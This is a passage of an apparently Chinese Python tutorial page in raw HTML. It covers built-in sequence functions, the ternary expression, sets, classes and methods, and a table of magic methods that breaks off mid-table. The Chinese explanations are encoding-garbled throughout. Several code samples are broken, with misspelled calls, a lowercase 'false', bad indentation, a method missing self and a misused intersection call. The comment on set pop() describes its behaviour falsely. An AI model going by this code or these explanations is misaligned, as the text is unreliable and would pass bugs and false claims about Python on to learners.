python&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h5 id="0x03-åºåˆ—æ“ä½œ"><a href="#0x03-åºåˆ—æ“ä½œ" class="headerlink" title="0x03:åºåˆ—æ“ä½œ"></a>0x03:åºåˆ—æ“ä½œ</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">all()</span><br><span class="line">any()</span><br><span class="line">sorted()</span><br><span class="line">reverse()</span><br><span class="line">range()</span><br><span class="line">zip()</span><br><span class="line">enumerate()</span><br></pre></td></tr></table></figure>

<p><code>all()</code>ä¸çš„å…³ç³»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç”¨äºåˆ¤æ–­ç»™å®šçš„å¯è¿­ä»£å‚æ•°iterableä¸­çš„æ‰€æœ‰å…ƒç´ æ˜¯å¦éƒ½ä¸ºTRUEï¼Œå¦‚æœæ˜¯è¿”å›Trueï¼Œå¦åˆ™è¿”å›Falseå…ƒç´ ï¼Œé™¤äº†æ˜¯0ï¼Œç©ºï¼ŒFALSEå¤–éƒ½ç®—TRUE</span></span><br><span class="line"><span class="comment">#å‡½æ•°ç­‰ä»·äºï¼š</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">all</span>(<span class="params">iterable</span>):</span></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> element:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¯­æ³•</span></span><br><span class="line"><span class="comment"># all(iterable)</span></span><br><span class="line"><span class="comment">#å‚æ•°</span></span><br><span class="line"><span class="comment">#iterable å…ƒç»„æˆ–è€…åˆ—è¡¨</span></span><br><span class="line"><span class="comment">#tip</span></span><br><span class="line"><span class="comment">#ç©ºå…ƒç»„ã€ç©ºåˆ—è¡¨è¿”å›å€¼ä¸ºTrue</span></span><br><span class="line"></span><br><span class="line">li = []</span><br><span class="line">tup = ()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#Trur</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#True</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="literal">False</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(li)) <span class="comment">#False</span></span><br><span class="line">tup = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">all</span>(tup)) <span class="comment">#False</span></span><br></pre></td></tr></table></figure>

<p><code>any()</code>æˆ–çš„å…³ç³»</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç”¨äºåˆ¤æ–­ç»™å®šçš„å¯è¿­ä»£å‚æ•°iterableæ˜¯å¦å…¨éƒ¨ä¸ºFalseï¼Œåˆ™è¿”å›Falseï¼Œå¦‚æœæœ‰ä¸€ä¸ªTrueï¼Œåˆ™è¿”å›True</span></span><br><span class="line"><span class="comment">#å‡½æ•°ç­‰ä»·äº</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">any</span>(<span class="params">iterable</span>):</span></span><br><span class="line">    <span class="keyword">for</span> element <span class="keyword">in</span> iterable:</span><br><span class="line">        <span class="keyword">if</span> element:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">     <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¾‹å­</span></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">any</span>(li)) <span class="comment">#True</span></span><br><span class="line">li = [<span class="number">0</span>,<span class="literal">False</span>]</span><br><span class="line"><span class="built_in">print</span>(ant(li)) <span class="comment">#False</span></span><br><span class="line">li = [<span class="string">&#x27;&#x27;</span>,<span class="number">0</span>,false]</span><br></pre></td></tr></table></figure>

<p><code>sorted()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å¯¹æ‰€æœ‰å¯è¿­ä»£çš„å¯¹è±¡è¿›è¡Œæ’åºæ“ä½œ(list str tuple dict)</span></span><br><span class="line"><span class="comment">#å’ŒsortåŒºåˆ«ï¼š</span></span><br><span class="line"><span class="comment">#sortæ˜¯åº”ç”¨å†listä¸Šçš„æ–¹æ³•ï¼Œsortedå¯ä»¥å¯¹æ‰€æœ‰å¯è¿­ä»£å¯¹è±¡è¿›è¡Œæ’åºæ“ä½œ</span></span><br><span class="line"><span class="comment">#listçš„sortæ–¹æ³•è¿”å›çš„æ˜¯å¯¹å·²ç»å­˜åœ¨çš„åˆ—è¡¨è¿›è¡Œæ“ä½œï¼Œ</span></span><br><span class="line">  <span class="comment">#è€Œå†…å»ºå‡½æ•°sortedæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„listï¼Œè€Œä¸æ˜¯åœ¨åŸæ¥çš„åŸºç¡€ä¸Šè¿›è¡Œçš„</span></span><br><span class="line"><span class="comment">#è¯­æ³•ï¼š</span></span><br><span class="line"><span class="comment"># sorted(iterable[,cmp[,key[,reverse]]])</span></span><br><span class="line"><span class="comment">#å‚æ•°ï¼š</span></span><br><span class="line"><span class="comment">#cmp æ¯”è¾ƒå‡½æ•°ï¼Œè¿™ä¸ªå…·æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå‚æ•°çš„å€¼éƒ½æ˜¯ä»å¯è¿­ä»£å¯¹è±¡ä¸­å–å‡ºï¼Œæ­¤å‡½æ•°å¿…é¡»éµå®ˆçš„è§„åˆ™ä¸ºï¼Œå¤§äºåˆ™è¿”å›1ï¼Œå°äºåˆ™è¿”å›-1ï¼Œç­‰äºåˆ™è¿”å›0</span></span><br><span class="line"><span class="comment">#key ä¸»è¦æ˜¯ç”¨æ¥è¿›è¡Œæ¯”è¾ƒçš„å…ƒç´ ï¼Œåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œå…·ä½“çš„å‡½æ•°çš„å‚æ•°å°±æ˜¯å–è‡ªäºå¯è¿­ä»£å¯¹è±¡ä¸­å»ï¼ŒæŒ‡å®šå¯è¿­ä»£å¯¹è±¡ä¸­çš„ä»¥æ¶æå…ƒç´ æ¥è¿›è¡Œæ’åº</span></span><br><span class="line"><span class="comment">#reverse æ’åºè§„åˆ™ï¼Œreverse = True é™åºï¼Œåä¹‹å‡åº</span></span><br><span class="line"><span class="comment">#è¿”å›é‡æ–°æ’åºçš„åˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">8</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li))  <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li,reverse=<span class="literal">True</span>)) <span class="comment">#[8, 6, 5, 3, 2, 1]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(li,reverse=<span class="literal">False</span>)) <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br><span class="line">li.sort()</span><br><span class="line"><span class="built_in">print</span>(li) <span class="comment">#[1, 2, 3, 5, 6, 8]</span></span><br></pre></td></tr></table></figure>

<p><code>reverse()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨äºåå‘åˆ—è¡¨ä¸­çš„å…ƒç´ </span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>]</span><br><span class="line">li.reverse()</span><br><span class="line"><span class="built_in">print</span>(li)</span><br></pre></td></tr></table></figure>

<p><code>range()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªæ•´æ•°åˆ—è¡¨ï¼Œä¸€èˆ¬ç”¨åœ¨forå¾ªç¯ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">range</span>(start,stop[,step])</span><br></pre></td></tr></table></figure>

<p><code>zip()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨æ¥æ‰“åŒ…çš„</span></span><br><span class="line">a = <span class="built_in">zip</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(a))</span><br><span class="line"><span class="comment"># [(1,&#x27;a&#x27;),(2,&#x27;b&#x27;),(3,&#x27;c&#x27;)]</span></span><br><span class="line"></span><br><span class="line">s1 = [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">s2 = [<span class="string">&#x27;ä½ &#x27;</span>,<span class="string">&#x27;æˆ‘&#x27;</span>,<span class="string">&#x27;ä»–&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">zip</span>(s1,s2)))</span><br><span class="line"><span class="comment"># [(&#x27;a&#x27;, &#x27;ä½ &#x27;), (&#x27;b&#x27;, &#x27;æˆ‘&#x27;), (&#x27;c&#x27;, &#x27;ä»–&#x27;)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸åŒåºåˆ—ä¸­çš„æ•°æ®æ ¹æ®ç´¢å¼•ä¸€ä¸€å¯¹åº”ï¼Œå¹¶ç»„æˆå…ƒç»„ï¼Œå„ä¸ªå…ƒç»„åˆç»„æˆä¸€ä¸ªåˆ—è¡¨ï¼Œæ¯ä¸ªå…ƒç»„å…ƒç´ çš„ä¸ªæ•°ç”±æœ€çŸ­çš„åºåˆ—å†³å®š</span></span><br></pre></td></tr></table></figure>

<p>ä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printBookInfo</span>():</span></span><br><span class="line">    books = [] </span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥å›¾ä¹¦ç¼–å·: &quot;</span>).split</span><br><span class="line">    bookName = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ä¹¦å:&quot;</span>)</span><br><span class="line">    bookPos = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ä½ç½®:&quot;</span>)</span><br><span class="line">    idList = <span class="built_in">id</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    bookNameList = bookName.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    posList = bookPos.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    bookInfo = <span class="built_in">zip</span>(idList, bookNameList, posList)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> bookInfo:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        éå†å›¾ä¹¦ä¿¡æ¯ï¼Œè¿›è¡Œå­˜å‚¨</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        dictInfo = &#123;<span class="string">&#x27;ç¼–å·&#x27;</span>:item[<span class="number">0</span>],<span class="string">&#x27;ä¹¦å&#x27;</span>:item[<span class="number">1</span>],<span class="string">&#x27;ä½ç½®&#x27;</span>:item[<span class="number">2</span>]&#125;</span><br><span class="line">        books.append(dictInfo)</span><br><span class="line">        <span class="comment">#å°†å­—å…¸å¯¹è±¡æ·»åŠ åˆ°listå®¹å™¨ä¸­</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> books:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">printBookInfo()</span><br></pre></td></tr></table></figure>

<p><code>enumerate()</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç”¨äºå°†ä¸€ä¸ªå¯éå†çš„æ•°æ®å¯¹è±¡ç»„åˆä¸ºä¸€ä¸ªç´¢å¼•åºåˆ—ï¼ŒåŒæ—¶åˆ—å‡ºæ•°æ®å’Œæ•°æ®ä¸‹æ ‡ï¼Œä¸€èˆ¬ç”¨åœ¨forå¾ªç¯ä¸­</span></span><br><span class="line"><span class="comment"># enumerate(sequence,[start=0])</span></span><br><span class="line"></span><br><span class="line">li = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(li, start=<span class="number">0</span>):</span><br><span class="line">     <span class="built_in">print</span>(i) <span class="comment">#ç´¢å¼•åŠ å…ƒç´ çš„å…ƒç»„ç±»å‹</span></span><br><span class="line"> <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(li):</span><br><span class="line">       <span class="built_in">print</span>(i, j) <span class="comment">#åˆ†åˆ«è¾“å‡ºå¯¹åº”çš„å€¼</span></span><br><span class="line">dictA = &#123;&#125;</span><br><span class="line">dictA[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;cookie&#x27;</span></span><br><span class="line">dictA[<span class="string">&#x27;sex&#x27;</span>] = <span class="string">&#x27;female&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(dictA):</span><br><span class="line">    <span class="built_in">print</span>(i)  <span class="comment">#ç´¢å¼•åŠ é”®çš„å…ƒç»„ç±»å‹</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">enumerate</span>(dictA):</span><br><span class="line">    <span class="comment">#éå†å­—å…¸</span></span><br><span class="line">    <span class="built_in">print</span>(i, j, dictA[j])</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h5 id="0x04-ä¸‰å…ƒè¿ç®—"><a href="#0x04-ä¸‰å…ƒè¿ç®—" class="headerlink" title="0x04:ä¸‰å…ƒè¿ç®—"></a>0x04:ä¸‰å…ƒè¿ç®—</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">result = å€¼1 if æ¡ä»¶ else å€¼2</span><br></pre></td></tr></table></figure>

<h5 id="0x05-seté›†åˆ"><a href="#0x05-seté›†åˆ" class="headerlink" title="0x05:seté›†åˆ"></a>0x05:seté›†åˆ</h5><p>setï¼ˆé›†åˆï¼‰æ˜¯pythonä¸­çš„ä¸€ç§æ•°æ®ç±»å‹ï¼Œæ˜¯ä¸€ä¸ªæ— åºä¸”ä¸é‡å¤çš„å…ƒç´ é›†åˆ</p>
<p>ç‰¹ç‚¹ï¼š</p>
<p>ä¸æ”¯æŒç´¢å¼•å’Œåˆ‡ç‰‡ï¼Œæ˜¯ä¸€ä¸ªæ— åºçš„ä¸”ä¸é‡å¤çš„å®¹å™¨ï¼Œç±»ä¼¼äºå­—å…¸ï¼Œä½†æ˜¯åªæœ‰keyæ²¡æœ‰value</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºé›†åˆæ–¹å¼ï¼š</span></span><br><span class="line"></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">list1 = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">5</span>]</span><br><span class="line">se2 = <span class="built_in">set</span>(list1)</span><br></pre></td></tr></table></figure>

<p><code>é›†åˆæ“ä½œå‡½æ•°</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># add()</span></span><br><span class="line">set1 = <span class="built_in">set</span>()</span><br><span class="line">set1.add(<span class="string">&#x27;python&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear() æ¸…ç©º</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set1.clear()</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># difference()  å·®é›† set1ä¸­å­˜åœ¨ï¼Œset2ä¸­ä¸å­˜åœ¨</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.difference(set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># intersection() äº¤é›†</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.intersection(set1, set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># union()  å¹¶é›†</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set2 = &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">set3 = set1.union(set1, set2)</span><br><span class="line"><span class="built_in">print</span>(set3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop() ç§»é™¤æ•°æ® ä»é›†åˆä¸­æ‹¿æ•°æ®å¹¶åˆ é™¤</span></span><br><span class="line"><span class="comment"># ç§»é™¤æœ€å°çš„æ•°æ®å¹¶å°†å‰©ä¸‹çš„æ•°æ®è¿›è¡Œå‡åºæ’åº</span></span><br><span class="line">set1 = &#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>&#125;</span><br><span class="line">set1.pop()</span><br><span class="line"><span class="built_in">print</span>(set1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># discard()</span></span><br><span class="line"><span class="comment"># update() æ›´æ–°æ•°æ®</span></span><br></pre></td></tr></table></figure>

<h3 id="7-é¢å‘å¯¹è±¡"><a href="#7-é¢å‘å¯¹è±¡" class="headerlink" title="7.é¢å‘å¯¹è±¡"></a>7.é¢å‘å¯¹è±¡</h3><h5 id="0x01-ä»‹ç»"><a href="#0x01-ä»‹ç»" class="headerlink" title="0x01:ä»‹ç»"></a>0x01:ä»‹ç»</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼šå°†æ•°æ®å’Œå‡½æ•°ç»‘å®šï¼Œè¿›è¡Œå°è£…ï¼Œè¿™æ ·èƒ½å¤Ÿæ›´å¿«é€Ÿåœ°å¼€å‘ç¨‹åºï¼Œå‡å°‘é‡å¤ä»£ç çš„é‡å†™è¿‡ç¨‹ï¼ˆå…³æ³¨è®¾è®¡æ€ç»´</span><br><span class="line">â€”â€”â€”â€”é€‚åˆåšå¤§é¡¹ç›®</span><br></pre></td></tr></table></figure>

<p><code>ç±»å’Œå¯¹è±¡</code></p>
<p>å¯¹è±¡æ˜¯ç±»çš„å®ä¾‹</p>
<h5 id="0x02-å®šä¹‰ç±»"><a href="#0x02-å®šä¹‰ç±»" class="headerlink" title="0x02:å®šä¹‰ç±»"></a>0x02:å®šä¹‰ç±»</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#class Foo(object):</span></span><br><span class="line"><span class="comment">#    å±æ€§</span></span><br><span class="line"><span class="comment">#    æ–¹æ³•åˆ—è¡¨</span></span><br><span class="line"><span class="comment">#    pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    name = <span class="string">&#x27;yuer&#x27;</span></span><br><span class="line">    age = <span class="number">18</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>(<span class="params">self</span>):</span> <span class="comment">#selfå…³é”®å­—</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;åƒé¥­&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sing</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">a = Person() <span class="comment">#è¿›è¡Œå®ä¾‹åŒ–ï¼Œaä¸ºå¯¹è±¡</span></span><br><span class="line">a.eat() <span class="comment">#è°ƒç”¨æ–¹æ³•</span></span><br></pre></td></tr></table></figure>

<h5 id="0x03-å®ä¾‹æ–¹æ³•ã€å±æ€§ã€é™æ€æ–¹æ³•ã€ç±»æ–¹æ³•"><a href="#0x03-å®ä¾‹æ–¹æ³•ã€å±æ€§ã€é™æ€æ–¹æ³•ã€ç±»æ–¹æ³•" class="headerlink" title="0x03:å®ä¾‹æ–¹æ³•ã€å±æ€§ã€é™æ€æ–¹æ³•ã€ç±»æ–¹æ³•"></a>0x03:å®ä¾‹æ–¹æ³•ã€å±æ€§ã€é™æ€æ–¹æ³•ã€ç±»æ–¹æ³•</h5><p>å®ä¾‹æ–¹æ³•ï¼šåœ¨ç±»çš„å†…éƒ¨ï¼Œä½¿ç”¨defå…³é”®å­—å¯ä»¥å®šä¹‰ä¸€ä¸ªå®ä¾‹æ–¹æ³•ï¼Œä¸ä¸€èˆ¬å‡½æ•°å®šä¹‰ä¸åŒï¼Œç±»æ–¹æ³•å¿…é¡»åŒ…å«å‚æ•°<code>self</code>ï¼Œä¸”ä¸ºç¬¬ä¸€ä¸ªå‚æ•°</p>
<p>å±æ€§ï¼šåœ¨ç±»çš„å†…éƒ¨å®šä¹‰çš„å˜é‡ï¼ˆç±»å±æ€§</p>
<p>å®ä¾‹å±æ€§ï¼šå®šä¹‰åœ¨æ–¹æ³•é‡Œé¢ä½¿ç”¨selfå¼•ç”¨çš„å±æ€§ç§°ä¹‹ä¸ºå®ä¾‹å±æ€§</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    native_place=<span class="string">&#x27;&#x27;</span> <span class="comment">#ç›´æ¥å†™åœ¨ç±»é‡Œé¢çš„å˜é‡ä¸ºç±»å±æ€§</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#å®ä¾‹æ–¹æ³•</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">eat</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;eat action&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#é™æ€æ–¹æ³•</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">method</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;é™æ€æ–¹æ³•&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#ç±»æ–¹æ³•</span></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cm</span>(<span class="params">cls</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç±»æ–¹æ³•&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#åˆå§‹åŒ–æ–¹æ³• ï¼ˆæ„é€ æ–¹æ³•</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">		self.name = <span class="string">&#x27;å°æ˜&#x27;</span> <span class="comment">#å®ä¾‹å±æ€§</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">p = Person()</span><br></pre></td></tr></table></figure>

<h5 id="0x04-é­”æœ¯æ–¹æ³•"><a href="#0x04-é­”æœ¯æ–¹æ³•" class="headerlink" title="0x04:é­”æœ¯æ–¹æ³•"></a>0x04:é­”æœ¯æ–¹æ³•</h5><p><a href="https://www.cnblogs.com/nmb-musen/p/10861536.html">python é­”æœ¯æ–¹æ³•</a></p>
<p><a href="https://blog.csdn.net/weixin_44251004/article/details/86503238">å¸¸ç”¨çš„é­”æœ¯æ–¹æ³•</a></p>
<table>
<thead>
<tr>
<th>é­”æœ¯æ–¹æ³•</th>
<th>è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td><code>__new__</code></td>
<td>åœ¨å¯¹è±¡å®ä¾‹åŒ–çš„æ—¶å€™æœ€å…ˆè°ƒç”¨çš„æ–¹æ³•</td>
</tr>
<tr>
<td><code>__init__</code></td>
<td>æ„é€ æ–¹æ³•</td>
</tr>
<tr>
<td><code>__del__</code></td>
<td>ææ„æ–¹æ³•</td>
</tr>
<tr>
<td><code>__call__</code></td>
<td>å½“å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨çš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨æ­¤æ–¹æ³•</td>
</tr>
<tr>
<td><code>__len__</code></td>
<td>å½“å¯¹è±¡è¢«å½“ä½œlen()è°ƒç”¨çš„æ—¶å€™</td>
</tr>
<tr>
<td><code>__repr__</code></td>
<td>å½“å¯¹è±¡è¢«å½“ä½œrepr()è°ƒç”¨çš„æ—¶å€™</td>
</tr>
<tr>
<td><code>__str__</code></td>
<td>å½“å¯¹è±¡è¢«å½“ä½œstr()è°ƒç”¨çš„æ—¶å€™</td>
</tr>
<tr>
<td><code>__bytes__</code></td>
<td>å½“å¯¹è±¡è¢«å½“ä½œbytes()è°ƒç”¨çš„æ—¶å€™</td>
</tr>
<tr>
<td><code>__hash__</code></td>
<td>å½“å¯¹è±¡è¢«å½“ä½œhash()è°ƒç”¨çš„æ—¶å€™</td>
</tr>
<tr>
<td><code>__bool__</code></td>
<td>å½“å¯¹è±¡è¢«å½“ä½œbool()è°ƒç”¨çš„æ—¶å€™ï¼Œåº”è¯¥è¿”å›trueæˆ–false</td>
</tr>
<tr>
<td><code>__format__</code></td>
<td>å½“å¯¹è±¡è¢«å½“ä½œformat()è°ƒç”¨çš„æ—¶å€™</td>
</tr>
<tr>
<td><code>__getattr__</code></td>
<td>å½“è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§çš„æ—¶å€™æ‰§è¡Œçš„è¡Œä¸º</td>
</tr>
<tr>
<td><code>__getattribute__</code></td>
<td>å½“è¯¥ç±»çš„å±æ€§è¢«è®¿é—®æ—¶æ‰€æ‰§è¡Œçš„è¡Œä¸º</td>
</tr>
<tr>
<td><code>__setattr__</code></td>
<td>å®šä¹‰å½“ä¸€ä¸ªå±æ€§è¢«è®¾ç½®æ—¶çš„è¡Œä¸º</td>
</tr>
<tr>
<td><code>__delattr__</code></td>
<td>å®šä¹‰å½“ä¸€ä¸ªå±æ€§è¢«åˆ é™¤æ—¶çš„è¡Œä¸º</td>
</tr>
<tr>
<td><code>__dir__</code></td>
<td>å½“å¯¹è±¡è¢«å½“ä½œdir()è°ƒç”¨æ—¶çš„è¡Œä¸º</td>
</tr>
<tr>
<td><code>__get__</code></td>
<td>å®šä¹‰å½“æè¿°ç¬¦çš„å€¼è¢«å–å¾—æ—¶çš„è¡Œä¸º</td>
</tr>
<tr>
<td><code>__reduce__</code></td>
